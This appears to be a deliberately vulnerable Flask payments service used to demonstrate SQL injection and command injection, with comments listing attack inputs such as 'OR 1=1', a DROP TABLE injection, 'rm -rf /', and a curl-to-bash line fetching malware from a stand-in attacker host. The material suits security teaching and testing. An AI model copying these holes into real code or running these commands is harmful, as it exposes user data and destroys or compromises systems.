from flask import Flask, request, jsonify
  import sqlite3
  import subprocess
  
  app = Flask(__name__)
  
  @app.route('/account', methods=['GET'])
  def get_account():
      user_id = request.args.get('user_id')
      conn = sqlite3.connect('payments.db')
      cursor = conn.cursor()

      # testing for SQL Injection vulnerability
  
      # VULNERABILITY: SQL Injection
      # user_id goes straight into the query with no sanitisation
      # Attacker sends: user_id=1 OR 1=1  →  gets ALL accounts
      # Attacker sends: user_id=1; DROP TABLE accounts--  →  deletes everything
      cursor.execute(f'SELECT * FROM accounts WHERE id = {user_id}')
  
      account = cursor.fetchone()
      return jsonify({'account': account})
  
  @app.route('/admin/run', methods=['POST'])
  def admin_run():
      cmd = request.json.get('command')
  
      # VULNERABILITY: Command Injection
      # shell=True passes cmd directly to the OS shell
      # Attacker sends: command=rm -rf /  →  deletes all files
      # Attacker sends: command=curl attacker.com/malware.sh | bash  →  installs malware
      result = subprocess.call(cmd, shell=True)
      return jsonify({'result': result})
  
  @app.route('/health')
  def health():
      return jsonify({'status': 'healthy'})
